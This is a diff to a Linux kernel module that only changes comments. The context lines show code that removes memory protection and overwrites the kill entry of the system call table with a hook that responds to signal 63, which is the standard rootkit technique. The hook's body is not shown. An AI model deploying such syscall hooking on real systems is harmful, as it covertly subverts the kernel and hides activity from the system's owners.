@@ -42,11 +42,11 @@ static struct kprobe kp_kallsyms_func = {
 typedef unsigned long (*kallsyms_lookup_name_p_t)(const char *name);
 static kallsyms_lookup_name_p_t kallsyms_lookup_name_p = NULL;
 
-/* Function signature for the `kill` system call */
+/* Function signature for the `sys_kill` system call */
 typedef asmlinkage long (*pt_regs_t)(const struct pt_regs *regs);
 
 /*
- * Stores the function pointer to the original `kill` system call, used when
+ * Stores the function pointer to the original `sys_kill` system call, used when
  * restoring the system call table to its original state
  */
 static pt_regs_t orig_kill = NULL;
@@ -143,15 +143,17 @@ static pte_t *page_from_virt(unsigned long addr) {
 #endif
 
 /*
- * Wrapper function that is called whenever the `kill` system call is executed.
+ * Wrapper function that is called whenever the `sys_kill` system call is executed.
+ * Refer to https://syscalls64.paolostivanin.com/
  *
- * Note: `kill` must always be called with two arguments: the signal number and
- * the PID. To test this hook, you can just use 1 as the PID (it's value is
- * ignored anyways).
+ * Note: the `kill` command must always be called with two arguments: the signal
+ * number and the PID. This is due to them being required arguments in the
+ * underlying system call. To test this hook, you can just use 1 as the PID (its
+ * value is ignored so long as the signal is 63).
  *
  * @param regs pointer to a struct containing the register values (i.e. function
  * arguments)
- * @return original `kill` return value, or 0
+ * @return original `sys_kill` return value, or 0
 */
 static asmlinkage long kill_hook(const struct pt_regs *regs)
 {
@@ -176,14 +178,14 @@ static asmlinkage long kill_hook(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
-/* Overwrites the system call table for the `kill` system call. */
+/* Overwrites the system call table for the `sys_kill` system call. */
 static void overwrite_sys_call_table(void)
 {
     /* Unprotect memory before overwriting system call table */
     unprotect_memory();
 
     /*
-     * Stores the function pointer to the original `kill` system call and
+     * Stores the function pointer to the original `sys_kill` system call and
      * overwrites the table entry with the address of our own kill_hook function
      */
     orig_kill = (pt_regs_t)__sys_call_table[__NR_kill];
@@ -200,7 +202,7 @@ static void restore_sys_call_table(void)
     unprotect_memory();
 
     /*
-     * Restores the table entry for the `kill` system call with the original
+     * Restores the table entry for the `sys_kill` system call with the original
      * function pointer
      */
     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
